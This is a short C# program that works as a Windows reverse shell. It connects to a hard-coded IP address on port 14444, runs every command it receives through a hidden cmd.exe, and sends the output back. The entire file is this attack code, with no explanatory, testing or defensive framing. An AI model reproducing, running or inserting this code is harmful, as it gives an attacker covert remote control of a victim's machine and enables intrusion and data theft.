using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;

public class Program {
    public static void Main() {
        using(TcpClient client = new TcpClient("81.0.246.226", 14444)) {
            using(Stream stream = client.GetStream()) {
                using(StreamReader rdr = new StreamReader(stream)) {
                    using(StreamWriter wrt = new StreamWriter(stream)) {
                        String cmd;
                        while((cmd = rdr.ReadLine()) != null) {
                            try {
                                Process proc = new Process();
                                proc.StartInfo.FileName = "cmd.exe";
                                proc.StartInfo.Arguments = "/c " + cmd;
                                proc.StartInfo.RedirectStandardOutput = true;
                                proc.StartInfo.UseShellExecute = false;
                                proc.StartInfo.CreateNoWindow = true;
                                proc.Start();
                                string output = proc.StandardOutput.ReadToEnd();
                                proc.WaitForExit();
                                wrt.WriteLine(output);
                                wrt.Flush();
                            } catch (Exception ex) {
                                wrt.WriteLine("ERROR: " + ex.Message);
                                wrt.Flush();
                            }
                        }
                    }
                }
            }
        }
    }
}
